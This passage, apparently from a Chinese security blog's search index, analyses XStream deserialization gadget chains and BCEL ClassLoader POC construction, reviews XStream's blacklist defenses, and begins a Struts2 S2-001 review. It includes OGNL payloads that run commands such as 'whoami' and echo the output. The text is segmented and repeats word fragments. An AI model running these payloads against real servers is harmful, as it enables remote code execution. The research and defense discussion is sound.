\u52a8\u4eba \u4eba\u5fc3 \u6fc0\u52a8\u4eba\u5fc3 \u7684 Java \u53cd\u5c04 \u673a\u5236 \u4e86 \uff0c \u6211\u4eec \u63d0\u524d \u6784\u9020 \u597d method \u5bf9\u8c61 \uff0c \u5c31 \u53ef\u4ee5 \u8c03\u7528 \u4efb\u610f \u7684 \u51fd\u6570 \u3002   \u5229\u7528 \u94fe \u6bd4\u8f83 \u957f \uff0c \u6574\u7406 \u4e00\u4e0b \u8fc7\u7a0b   XStream   \u5904\u7406 Map \u7c7b\u578b   \u53bb \u8c03\u7528 jdk . nashorn . internal . objects . NativeString # hashCode   com . sun . xml . internal . bind . v2 . runtime . unmarshaller . Base64Data # toString   javax . activation . DataHandler # getDataSource   com . sun . xml . internal . ws . encoding . xml . XMLMessage $ XmlDataSource # getInputStream   javax . crypto . CipherInputStream # read   - >   getMoreData   javax . crypto . NullCipher # update   - >   chooseFirstProvider   javax . imageio . spi . FilterIterator # next   javax . imageio . ImageIO . ContainsFilter # filter   ProcessBuilder # start   \u4ece \u540e\u9762 \u5f80\u524d \u770b \u7684\u8bdd \uff0c \u6211\u4eec \u524d\u9762 \u505a \u7684 \u6240\u6709 \u64cd\u4f5c \u90fd \u662f \u4e3a\u4e86 \u80fd \u53bb \u89e6\u53d1   Iterator . next   \uff0c \u800c \u8fd9\u79cd   Iterator   \u7684 \u904d\u5386 \u5904\u7406 \uff0c \u6211\u4eec \u5f88 \u5bb9\u6613 \u518d \u627e\u5230 \u4e00\u5904 \uff0c \u4e0b \u4e00\u8282 \u5c31\u662f \u4e0d\u7528   javax . imageio . ImageIO . ContainsFilter # filter   \u6765 \u5b9e\u73b0 \u5229\u7528 \uff0c \u8bf7 \u7ee7\u7eed \u5f80\u4e0b \u770b XD","title":"4 .   ImageIO $ ContainsFilter"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#5-servicefinderlazyiterator","text":"\u601d\u8def \u6765\u81ea   \u6587\u7ae0 1   \u3001   \u6587\u7ae0 2   \u5148 \u6765\u770b \u4e00\u4e0b   java . util . ServiceLoader . LazyIterator # next   \u5f53\u7c7b \u5c5e\u6027   acc   \u4e3a \u7a7a\u65f6 \uff0c \u4f1a \u53bb \u8c03\u7528   nextService   \u51fd\u6570 \uff0c \u800c \u5728 \u8be5 \u51fd\u6570 \u91cc\u9762 \uff0c \u6211\u4eec \u770b\u5230 \u4e86 \u4ee4\u4eba \u719f\u6089 \u7684   Class . forName   \u7684 \u8c03\u7528 \u3002 \u5e76\u4e14 \u6211\u4eec \u53bb \u5b9e\u4f8b \u5316 \u7684   classname   \u3001   loader   \uff0c \u90fd \u662f \u7c7b \u5c5e\u6027 \uff0c \u5c5e\u4e8e \u6211\u4eec \u53ef\u4ee5 \u63a7\u5236 \u7684 \u4e1c\u897f \u3002   \u5230 \u4e86 \u8fd9\u91cc \u81ea\u7136 \u7136\u800c \u81ea\u7136\u800c\u7136 \u7684 \u5c31 \u60f3\u5230 \u4e86 \u4f7f\u7528 BCEL \u7684 ClassLoader \u6765 \u8f7d\u5165 classname \u91cc \u7684 \u5b57\u8282 \u7801 \u4e86 ( \u8fd9\u91cc \u6211 \u5728 fastjson \u90a3\u7bc7\u91cc \u63d0\u5230 \u8fc7 ) \u3002   \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u5728 ImageIO \u90a3\u6761 \u94fe \u7684 \u57fa\u7840 \u4e0a \uff0c \u5728 \u89e6\u53d1   Iterator . next   \u65f6 \u4f7f\u7528 \u8fd9\u4e2a   LazyIterator   \u6765 \u4ee3\u66ff","title":"5 .   ServiceFinder $ LazyIterator"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#bcel-classloaderpoc","text":"\u8fd9\u91cc \u6765 \u63d0 \u4e00\u4e0b \u5173\u4e8e POC \u7684 \u6784\u9020 \uff0c \u5982\u679c \u4f60 \u4f7f\u7528 \u4e86 \u5f53\u524d \u8fd9\u4e2a \u5229\u7528 \u94fe \uff0c \u5e76\u4e14 \u4e0d \u5bf9   ClassLoader   \u505a \u5904\u7406 \u7684\u8bdd \uff0c \u4f60 \u4f1a \u53d1\u73b0 \u600e\u4e48 \u90fd \u6253 \u4e0d\u901a \uff0c \u56e0\u4e3a \u8fd9\u91cc \u5728 \u5b9e\u9645 \u8fd8\u539f   ClassLoader   \u7684 \u65f6\u5019 \u51fa\u73b0 \u4e86 \u9519\u8bef   \u8fd9\u91cc \u6709 \u4e24\u79cd \u89e3\u51b3 \u65b9\u6848 \u89e3\u51b3\u65b9\u6848 \uff0c \u4e00\u662f \u53bb\u9664 \u8fd9\u79cd \u8fd8 \u539f\u6709 \u95ee\u9898 \u7684 \u7c7b \uff08 \u4f1a \u5f88 \u9ebb\u70e6 \uff09 \uff0c \u4e8c\u662f \u76f4\u63a5 \u628a   ClassLoader   \u91cc \u7684 \u4e00\u4e9b \u65e0\u5173 \u5173\u7d27 \u7d27\u8981 \u65e0\u5173\u7d27\u8981 \u7684 \u4e1c\u897f \u5254\u9664 \u6389 \u3002   \u8fd9\u91cc \u6211 \u9009\u62e9 \u4e86 \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \uff0c \u7ecf\u8fc7 \u8c03\u8bd5 \u53bb \u9664\u4e86 \u4ee5\u4e0b \u51e0\u4e2a \u5c5e\u6027 \u7684 \u503c   \u8fd9\u91cc \u7531\u4e8e \u6211\u4eec \u5254\u9664 \u4e86   ignored _ packages   \u548c   deferTo   \uff0c \u5bfc\u81f4 BCEL \u7684 ClassLoader \u5728 \u8f7d\u5165 \u666e\u901a \u7684 \u7c7b \u7684 \u65f6\u5019 \u4f1a \u51fa\u73b0 \u52a0\u8f7d \u9519\u8bef \u7684 \u95ee\u9898   \u6765 \u770b\u770b \u600e\u4e48 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898   \u9996\u5148 BCEL \u7684   ClassLoader . loadClass   \uff0c \u4e00\u5171 \u5c1d\u8bd5 4 \u6b21 \u4e0d\u540c \u7684 \u8f7d\u5165 \u65b9\u6cd5   \u4ece \u5f53\u524d ClassLoader \u7684 classes \u53bb \u627e   \u5bf9\u4e8e \u9ed8\u8ba4 \u5ffd\u7565 \u7684 \u5305   java . / sun . / javax .   \uff0c \u4f7f\u7528   deferTo   \u53bb \u91cd\u65b0 \u52a0\u8f7d \uff0c \u8fd9\u91cc \u7684   deferTo   \u662f \u7cfb\u7edf \u7684 ClassLoader \uff08   ClassLoader . getSystemClassLoader ( )   )   \u5bf9\u4e8e classname \u4ee5   $ $ BCEL $ $   \u5f00\u5934 \u7684 \uff0c \u6839\u636e classname \u7684 \u503c \u53bb defineClass \uff0c \u8fd9\u8fb9 \u5c31\u662f \u6211\u4eec \u6700 \u559c\u6b22 \u7684 \u4efb\u610f \u8f7d\u5165 \u5b57\u8282 \u7801 \u7684 \u5730\u65b9   \u6700\u540e \u4e00\u6b21 \u662f \u7528   repository   \u53bb \u8f7d\u5165 \u5f53\u524d \u7684 classname \uff0c \u5982\u679c \u8fd9\u91cc \u8fd8 \u6ca1 \u627e\u5230 \uff0c \u5c31 \u4f1a \u7206 \u6ca1\u6709 \u627e\u5230 Class \u7684 \u9519\u8bef   PS \uff1a \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206   repository   \u53d6 \u7684   SyntheticRepository . getInstance ( )   \uff0c \u8fd8 \u4e0d\u662f \u5f88 \u6e05\u695a \u8fd9\u4e2a \u5de6\u53f3 \uff0c \u540e\u7eed \u6574\u7406 \u4e00\u4e0b ClassLoader \u76f8\u5173 \u7684 \u77e5\u8bc6 \u518d \u505a \u8865\u5145   \u518d \u6765\u770b \u6211\u4eec \u62a5\u9519 \u7684 \u539f\u56e0 \uff0c \u56e0\u4e3a \u5220\u9664   ignored _ packages   \u548c   deferTo   \u4e4b\u540e \uff0c \u76f8\u5f53 \u5f53\u4e8e \u76f8\u5f53\u4e8e \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u60c5\u51b5 \u65e0\u6cd5 \u8f7d\u5165 \u4e86 \uff0c \u800c \u663e\u7136   java . lang . Object   \u4e0d \u7b26\u5408 \u7b2c\u4e09 \u4e09\u79cd \u7b2c\u4e09\u79cd \u60c5\u51b5 \u3002 \u6700\u540e \u7b2c 4 \u79cd \u91cc\u9762 \u4e5f \u6ca1\u6709 \u627e\u5230 \u8fd9\u4e2a   java . lang . Object   \uff0c \u6240\u4ee5 \u6700\u7ec8 \u7206 \u4e86   ClassNotFoundException   \u8fd9\u91cc \u5176\u5b9e \u5df2\u7ecf \u5f88 \u660e\u663e \u4e86 \uff0c \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \uff0c \u6211\u4eec \u5f97 \u5728   classes   \u91cc \u6dfb\u52a0 \u6211\u4eec \u4f20\u5165 \u7684 class \u5b57\u8282 \u7801\u91cc \u6240\u7528 \u5230 \u7684 \u6240\u6709 \u7c7b \uff0c \u90a3\u4e48 \u5728 \u7b2c\u4e00 \u4e00\u6b21 \u7b2c\u4e00\u6b21 \u5c1d\u8bd5 \u8f7d\u5165 \u7684 \u65f6\u5019 \uff0c \u5c31 \u627e\u5230 \u4e86 \u76f8\u5e94 \u7684 \u7c7b \uff0c \u65e0\u9700 \u5c1d\u8bd5 \u540e\u7eed \u7684 \u51e0\u79cd \u8f7d\u5165 \u65b9\u5f0f \u3002   \u6bd4\u5982 \u8fd9\u91cc \u6211 \u4ea7\u751f \u7684 \u5b57\u8282 \u7801 \u91cc\u9762 \u7528 \u4e0a \u4e86   Runtime   \uff0c \u5c31 \u5f97 \u52a0\u4e0a \u8fd9\u4e2a \u7c7b   \u8fd9\u91cc \u7684 Object \u5fc5\u987b \u52a0\u4e0a \uff0c \u6bd5\u7adf \u6240\u6709 \u7684 \u5bf9\u8c61 \u90fd \u7ee7\u627f \u81ea Object","title":"\u4fee\u6539 BCEL   ClassLoader \u6784\u9020 POC"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x03-xstream","text":"XStream \u5728 1.4 . 7 \u7248\u672c \u4e4b\u540e \u652f\u6301 \u4f7f\u7528 \u540d\u5355 \u767d\u540d\u5355 \u548c \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u65b9\u5f0f \u6765 \u65b9\u5f0f \u6076\u610f \u7c7b \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   security   Starting   with   XStream   1.4 . 7 ,   it   is   possible   to   define   permissions   for   types ,   to   check   the   type   of   an   object   that   should   be   unmarshalled .   Those   permissions   can   be   used   to   allow   or   deny   types   explicitly   With   these   permissions   it   is   at   least   not   possible   to   inject   unexpected   types   into   an   object   graph .   The   security   framework   supports   the   setup   of   a   black   or   white   listing   scenario .   Any   application   should   use   this   feature   to   limit   the   danger   of   arbitrary   command   execution   if   it   deserializes   data   from   an   external   source .   XStream   itself   sets   up   a   black   list   by   default ,   i . e .   it   blocks   all   currently   known   critical   classes   of   the   Java   runtime .   Main   reason   for   the   black   list   is   compatibility ,   because   otherwise   newer   versions   of   XStream   1.4 . x   can   no   longer   be   used   as   drop - in   replacement .   Unfortunately   this   provides   a   false   sense   of   security .   Every   XStream   client   should   therefore   switch   to   a   white   listing   on   its   own   as   soon   as   possible .   XStream   itself   will   use   white   listing   as   default   starting   with   1.5 . x   and   only   clients   that   have   also   changed   their   setup   will   be   able   to   use   this   newer   version   again   as   drop - in   replacement .   \u8fd9\u91cc \u4e3b\u8981 \u770b \u4e00\u4e0b \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u5904\u7406","title":"0x03   XStream \u7684 \u9632\u5fa1 \u63aa\u65bd"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#147-149","text":"EventHandler   \u7684 \u5904\u7406 \u7531   ReflectionConverter   \u6765 \u5904\u7406 \u7684 \uff0c \u5728 1.4 . 7 - 1.4 . 9 \u7248\u672c \uff0c \u5728   canConvert   \u5904 \u6dfb\u52a0 \u4e86 \u5bf9   EventHandler   \u7684 \u9650\u5236   \u6240\u4ee5   EventHandler   \u7684 POC \u5c31 \u5931\u6548 \u4e86 \uff0c \u4f46\u662f \u5176\u4ed6 \u7684 \u51e0\u79cd \u5e76 \u6ca1\u6709 \u5931\u6548","title":"1.4 . 7 - 1.4 . 9"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#1410","text":"\u5728 1.4 . 10 \u7248\u672c \u589e\u52a0 \u4e86   setupDefaultSecurity   \u65b9\u5f0f \u6765 \u8bbe\u7f6e \u9ed8\u8ba4 \u7684 \u540d\u5355 \u767d\u540d\u5355 \uff0c \u4f46\u662f \u8fd9\u4e2a \u7248\u672c \u628a \u4e0a\u9762   EventHandler   \u7684 \u9650\u5236 \u53bb\u6389 \u4e86 \uff0c \u5bfc\u81f4 \u53c8 \u53ef\u4ee5 \u4f7f\u7528 \u6700\u65e9 \u7684 POC \uff0c \u9700\u8981 \u6ce8\u610f \u7684 \u662f \u8fd9 \u662f \u6ca1 \u4fee\u8865 \u524d \u7684   1.4 . 10   \uff0c \u4fee\u590d \u540e \u5df2\u7ecf \u4e0d \u53ef\u4ee5 \u4e86   \u9664\u4e86 \u65b0\u589e \u8bbe\u7f6e \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \uff0c \u4e5f \u65b0 \u589e\u52a0 \u4e86   InternalBlackList   \u8fd9\u4e2a converter \uff0c \u4ed6 \u8bbe\u7f6e \u7684 \u6743\u9650 \u4e3a   LOW   \uff0c \u800c   ReflectionConverter   \u6743\u9650 \u4e3a   Very _ low   \uff0c \u6240\u4ee5 \u4f1a \u5148\u8fc7 \u4e00\u6b21 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u68c0\u67e5 \uff08 XStream \u5728 \u6ce8\u518c converters \u65f6 \uff0c \u4ee5 \u6743\u9650 \u7684 \u65b9\u5f0f \u6765 \u51b3\u5b9a \u6b21\u5e8f \uff09 \u3002   \u6240\u4ee5 \u8fd9\u91cc 1 , 4 , 5 \u90fd \u8dea \u4e86 \uff0c \u53ea \u5269\u4e0b groovy \u8fd9\u79cd \u4e86 \uff0c \u5f53\u7136 \u80af\u5b9a \u8fd8\u6709 \u5176\u4ed6 \u6ca1\u6709 \u53d1\u73b0 \u7684 \u5229\u7528 \u94fe \uff0c \u6240\u4ee5 \u6700 \u5b89\u5168 \u7684 \u65b9\u6cd5 \u8fd8\u662f \u4f7f\u7528 \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \uff0c \u4e0d\u80fd \u4f9d\u8d56 XStream \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u6765 \u505a \u5b89\u5168 \u9632\u5fa1 \u3002","title":"& gt ; = 1.4 . 10"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x04","text":"\u672c\u6587 \u4e3b\u8981 \u56de\u987e \u4e86 \u73b0\u6709 \u7684 \u4e00\u4e9b \u5229\u7528 \u94fe \uff0c \u503c\u5f97 \u6ce8\u610f \u503c\u5f97\u6ce8\u610f \u7684 \u662f \uff1a   \u5982\u679c XStream \u7528 \u7684 \u4e0d\u662f \u540d\u5355 \u767d\u540d\u5355 \u6a21\u5f0f \uff0c \u8fd8\u662f \u5b58\u5728 \u5229\u7528 \u7684 \u53ef\u80fd \u53ef\u80fd\u6027 \u7684 \u3002 \u73b0\u6709 \u5185\u7f6e \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u53ea \u7981\u6b62 \u4e86 \u51e0\u4e2a \u73b0\u6709 \u7684 \u5229\u7528 \u94fe \uff0c \u6211\u4eec \u8fd8\u662f \u53ef\u4ee5 \u627e\u5230 \u5176\u4ed6 \u53ef\u4ee5 \u5229\u7528 \u7684 \u5229\u7528 \u94fe \u7684 \uff0c \u6bd4\u5982 \u524d\u9762 \u63d0\u5230 \u7684 Groovy \u7684 \u5229\u7528 \u94fe \u3002   \u9700\u8981 \u8bb0\u4f4f \u7684 \u662f XStream \u4ed6 \u7684 \u89e6\u53d1 \u65b9\u5f0f \u4f9d\u8d56 \u7684 \u662f HashMap \u3001 TreeSet \u8fd9\u79cd \u7c7b\u578b \u81ea\u52a8 \u8c03\u7528 \u7684   hashCode   \u3001   compareTo   \u4e32 \u8d77\u6765 \u7684 \uff0c \u540e\u7eed \u53ef\u4ee5 \u6ce8\u610f \u4e00\u4e0b \u8fd9\u79cd \u53ef\u80fd \u7684 \u8c03\u7528 \u94fe \u3002   PS \uff1a \u672c\u6587 \u63d0\u5230 \u7684 \u6240\u6709 POC \uff0c \u5df2\u7ecf \u66f4\u65b0 \u5230   GitHub   \u4e0a","title":"0x04   \u603b\u7ed3"},{"location":"blog/2020/talk_about_struts2/","tags":["java"],"text":"0x00   \u524d\u8a00   17 \u5e74 \u7684 \u65f6\u5019 \u6574\u7406 \u8fc7 struts2 \u76f8\u5173 \u7684 POC \uff0c \u65f6\u9694 3 \u5e74 \uff0c \u867d\u7136 struts2 \u5df2\u7ecf \u4e0d\u518d \u90a3\u4e48 \u6d41\u884c \u4e86 \uff0c \u4f46\u662f \u8fd8\u662f \u6709 \u5f88\u5927 \u7684 \u7814\u7a76 \u4ef7\u503c \uff0c \u672c\u6587 \u5c06 \u4e00\u70b9 \u4e00\u70b9 \u4e00\u70b9\u4e00\u70b9 \u8ddf \u4e00\u4e0b struts2   \u6709 \u4ef7\u503c \u7684 \u6f0f\u6d1e XD   0x01   \u57fa\u7840   struts2   \u6e90\u7801 \u4e0b\u8f7d https : / / archive . apache . org / dist / struts / source /   struts2 \u5de5\u4f5c \u6d41\u7a0b   https : / / blog . csdn . net / snow _ 7 / article / details / 51513381   ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f https : / / www . cnblogs . com / renchunxiao / p / 3423299 . html   struts2   \u6280\u672f \u5185\u5e55   \u7b2c 6 \u7ae0   OGNL   struts2 \u6f0f\u6d1e \u7684 \u4ea7\u751f \u901a OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c \u6709 \u5f88\u5927 \u7684 \u5173\u8054 \uff0c \u5386\u53f2 \u4e0a \u5f88\u591a \u7248\u672c \u7684 \u6f0f\u6d1e \uff0c \u90fd \u56e0\u4e3a \u662f\u56e0\u4e3a \u4e0d \u5b89\u5168 \u7684 \u7528\u6237 \u8f93\u5165 \u6d41\u8f6c \u5230 \u4e86   Ognl . getValue   \u3001   Ognl . setValue   \u800c \u5bfc\u81f4 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u8ba1\u7b97 \u3002 \u540e\u6587 \u4e0d \u5bf9 Ognl \u540e\u7eed \u7684 \u5185\u5bb9 \u505a \u5206\u6790   / /   \u8c03\u7528 \u9759\u6001 \u51fd\u6570   \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4   Ognl   .   getValue   (   \" @ java . lang . Runtime @ getRuntime ( ) . exec ( ' open   / Applications / Calculator . app / ' ) \"   ,   context   ) ;   Ognl   .   setValue   (   \" ( \\ \" @ java . lang . Runtime @ getRuntime ( ) . exec ( \\ ' open   / System / Applications / Calculator . app / \\ ' ) \\ \" ) ( bla ) ( bla ) \"   ,   context   ,   \" \"   ) ;   \u66f4 \u591a \u7528\u6cd5 \u770b http : / / commons . apache . org / proper / commons - ognl / language - guide . html   \u5176\u4e2d \u5173\u4e8e   setValue   \u7684 \u5229\u7528 \u7528 \u7684 \u662f Expression   Evaluation \u90e8\u5206 \uff0c   ( 1 ) ( 2 ) ( 3 )   \u4e2d   ( 1 ) ( 2 )   \u88ab \u4f5c\u4e3a \u4e00\u4e2a \u6574\u4f53 \u89e3\u6790 \uff0c \u5bf9\u4e8e   ( 1 )   \u505a \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u89e3\u6790 \uff0c \u5982\u679c \u4f60 \u7528   getValue ( ( 1 ) ( 2 ) )   \u4f1a \u53d1\u73b0 \u5176\u5b9e \u4e5f \u80fd \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \uff0c \u800c   setValue ( ( 1 ) ( 2 ) ( 3 ) )   \u9700\u8981 double   evaluation \uff0c \u5b9e\u9645 \u5b9e\u9645\u4e0a \u53d8\u6210   ( ( 1 ) ( 2 ) ) ( 3 )   \uff0c \u5728 \u540e\u7eed \u8c03\u7528   setValueBody   \u51fd\u6570 \u65f6 \u53d6\u51fa \u7684   children [ 0 ]   \u5c31\u662f   ( 1 ) ( 2 )   \uff0c \u7b49\u540c \u540c\u4e8e \u7b49\u540c\u4e8e \u8c03\u7528   Ognl . getValue ( ( 1 ) ( 2 ) )   \u7684 \u6548\u679c \u3002 \u6240\u4ee5 \u8fd9\u91cc \u8c03\u7528   setValue   \u4e5f \u540c\u6837 \u53ef\u4ee5 \u8fbe\u6210   getValue   \u7684 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6548\u679c \u3002   \u540c\u6837 \uff0c \u6211\u4eec \u4e5f \u53ef\u4ee5 \u5229\u7528   children [ 1 ]   \u7684 \u4f4d\u7f6e \uff0c \u5982   ( 1 ) ( ( 2 ) ( 3 ) )   \u628a payload \u653e\u5230   ( 2 ) ( 3 )   \u5173\u4e8e   setValue   \u51fd\u6570 \u7684 \u53e6 \u4e00\u79cd \u5229\u7528 \u65b9\u6cd5 S2 - 009 \u7684 \u65b9\u5f0f   a [ ( 1 ) ( 2 ) ]   \uff0c \u5176\u4e2d   ( 1 ) ( 2 )   \u540e\u7eed \u4f1a \u5355\u72ec \u62ff \u51fa\u6765 \u88ab \u5f53\u4f5c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u3002   0x02   \u5386\u53f2 \u7248\u672c \u56de\u987e   1 .   S2 - 001   \u53c2\u8003 \uff1a https : / / xz . aliyun . com / t / 2044   \u6f0f\u6d1e \u4ea7\u751f \u539f\u56e0 \u5728\u4e8e \uff1a \u7528   < s : textfield >   \u6807\u7b7e \uff0c \u539f\u6837 \u8fd4\u56de \u7528\u6237 \u8f93\u5165 \u65f6 \uff0c \u4f1a\u8fc7 \u4e00\u6b21 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u89e3\u6790 \u6267\u884c \u3002 \u6bd4\u5982 \u573a\u666f \u767b\u9646 \u7684 \u5730\u65b9 \uff0c \u7528\u6237 \u6237\u540d \u7528\u6237\u540d \u5bc6\u7801 \u6821\u9a8c \u9519\u8bef \uff0c \u4e0d \u8df3\u8f6c \u9875\u9762 \uff0c \u76f4\u63a5 \u5c06 \u7528\u6237 \u6237\u540d \u7528\u6237\u540d \u548c \u5bc6\u7801 \u653e\u5230 \u9875\u9762 \u89e3\u6790 \u540e \u8fd4\u56de \u3002   source :   \u4f7f\u7528 \u4e86   s : textfield   \u6807\u7b7e \u7528\u4e8e \u8868\u5355 \u751f\u6210 \uff0c \u5f53 \u7528\u6237 \u8f93\u5165 \u4e0d \u5408\u6cd5 \u65f6 \uff0c \u5c06 \u7528\u6237 \u7684 \u8f93\u5165 \u5185\u5bb9 \u6e32\u67d3 \u5230 \u8fd4\u56de \u7684 \u9875\u9762 \u4e0a   sink :   jsp \u6e32\u67d3 \u8c03\u7528   doEndTag   \uff0c \u540e\u7eed \u7531\u4e8e \u8bc6\u522b \u51fa \u7528\u6237 \u8f93\u5165 \u4e2d OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u800c \u8c03\u7528   Ognl . getValue   \u6f0f\u6d1e \u5206\u6790   \u4e3b\u8981 \u51fa \u95ee\u9898 \u7684 \u662f JSP \u4e2d   < s : textfield >   \u6807\u7b7e \uff0c Struts2 \u91cc \u5904\u7406 textfield \u7684 \u662f   org . apache . struts2 . components . UIBean   \u770b\u5230 \u5728 \u5904\u7406 params \u65f6 \uff0c \u5f53 parameters \u91cc \u4e0d \u5b58\u5728   value   \u8fd9\u4e2a key \u7684 \u65f6\u5019 \uff0c \u4f1a \u8fdb\u5230 \u6267\u884c name \u76f8\u5bf9 \u5e94 \u7684 value \u4e0a\u6765 \u3002 \u5e76\u4e14   altSyntax   \u9ed8\u8ba4 \u914d\u7f6e \u4e3a   true   \u4f1a \u5728 \u5f53\u524d \u7684   name   \u5de6\u53f3 \u52a0\u4e0a OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6807\u8bc6   % { name }   \uff0c \u8fd9\u91cc \u7684 name \u662f   < s : textfield   name = \" name \"   \uff0c name \u5b57\u6bb5 \u7684 \u503c \uff0c \u6bd4\u5982 \u8fd9\u91cc   name = \" username \"   \uff0c \u6b64\u65f6 \u4f1a \u53d8\u6210   % { username }   . \u7ee7\u7eed \u5f80\u4e0b \u8ddf   \u8fd9\u91cc \u7684 String \u7c7b\u578b \u7684 \u8f6c\u5316 \u4e3b\u8981 \u7528 \u4e86   TextParesUtil . translateVariables ( )   \u6765 \u5904\u7406 \uff0c \u8fd9\u91cc \u770b\u770b \u5177\u4f53 \u4ed6 \u600e\u4e48 \u505a \u7684   com . opensymphony . xwork2 . util . TextParseUtil # translateVariables # 97   \u8fd9\u91cc \u4f1a \u53bb \u5224\u65ad \u4f20\u5165 \u7684 expression \u662f\u5426 \u662f\u5426\u662f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u683c\u5f0f \u7684   % { xxx }   \uff0c \u5982\u679c \u662f \u7684\u8bdd \uff0c \u5c31 \u4f1a \u53bb   OgnlValueStack   \u91cc\u9762 \u53bb \u627e \u5bf9\u5e94 \u7684 \u5185\u5bb9 ( \u8fd9\u5757 \u5c31\u662f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u8ba1\u7b97 \u7ed3\u679c \u8ba1\u7b97\u7ed3\u679c \uff0c   findValue   \u51fd\u6570 \u540e\u7eed \u4f1a \u53bb \u8c03\u7528   OgnlUtil . getValue   \uff0c \u8be6\u7ec6 \u7684 \u53ef\u4ee5 \u770b \u6211 \u57fa\u7840 \u91cc\u5217 \u7684 \u6587\u7ae0 )   \u6240\u4ee5 \u8fd9\u91cc \u6211\u4eec \u7b2c\u4e00 \u4e00\u904d \u7b2c\u4e00\u904d \u4f20\u5165 \u7684   % { name }   \u4f1a \u89e3\u6790 \u83b7\u5f97 \u5bf9\u5e94 \u7684 \u503c   % { @ java . lang . Runtime ..... }   \u7b2c\u4e8c \u4e8c\u904d \u7b2c\u4e8c\u904d \u4f1a \u53bb \u89e3\u6790   % { @ java . lang . Runtime .... }   \uff0c \u8fd9\u91cc \u6267\u884c \u4e86 \u6211\u4eec \u60f3\u8981 \u6267\u884c \u7684 \u547d\u4ee4 \u3002   \u56de\u663e POC   \u524d\u9762 \u7b80\u5355 \u7528 \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u8c03\u7528 \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u7684 \u5f62\u5f0f \u6765 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   @ java . lang . Runtime @ getRuntime ( ) . exec ( command )   \u8fd9\u91cc S2 - 001 \u5176\u5b9e \u662f \u4f1a \u76f4\u63a5 \u56de\u663e \u7684 \uff0c \u5c06 \u66ff\u6362 \u539f\u6709 \u7684 input \u6807\u7b7e \u7684 \u5185\u5bb9 \uff0c \u8fd9\u91cc \u6362 \u4e00\u79cd \u65b9\u5f0f \u6765 \u8fdb\u884c \u56de\u663e \uff0c \u5229\u7528 Struts2 \u7684 HttpServletResponse \u6765 \u5199\u5165 \u5185\u5bb9 \u3002   # writer = # context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter ( ) ,   # writer . println ( xxxxxx ) ,   # writer . flush ( ) ,   # writer . close ( )   \u5148 \u4ece \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 context \u4e2d \u53d6\u51fa   HttpServletResponse   \u7684 \u5b9e\u4f8b \uff0c \u7528\u5230 \u7684 \u5b9e\u9645 \u662f   HttpServletResponseWrapper   \u7136\u540e \u83b7\u53d6 \u5f53\u524d response \u7684 writer \u5bf9\u8c61 \uff0c \u5728 \u5229\u7528 \u8be5 writer \u6765 \u5199\u5165 \u4efb\u610f \u5185\u5bb9   \u6bd4\u5982   % { # writer = # context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter ( ) , # writer . println ( \" wh1t3p1g \" ) , # writer . flush ( ) , # writer . close ( ) }   \u5f53\u7136 \u4f60 \u4e5f \u53ef\u4ee5 \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u540e \u7684 \u5185\u5bb9   # pb = ( new   java . lang . ProcessBuilder ( \" whoami \" ) ) . start ( ) ,   # is = # pb . getInputStream ( ) ,   # isr = new   InputStreamReader ( # is ) ,   # br = new   BufferedReader ( # isr ) ,   # chars = new   char [ 500 ] ,   # br . read ( # chars ) ,   # str = new   java . lang . String ( # chars ) ,   / /   \u4e0a\u9762 \u4e3b\u8981 \u83b7\u53d6 \u6267\u884c \u540e \u7684 \u5185\u5bb9 \uff0c \u4e0b\u9762 \u4e3b\u8981 \u505a \u56de\u663e \u64cd\u4f5c   # writer = # context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter 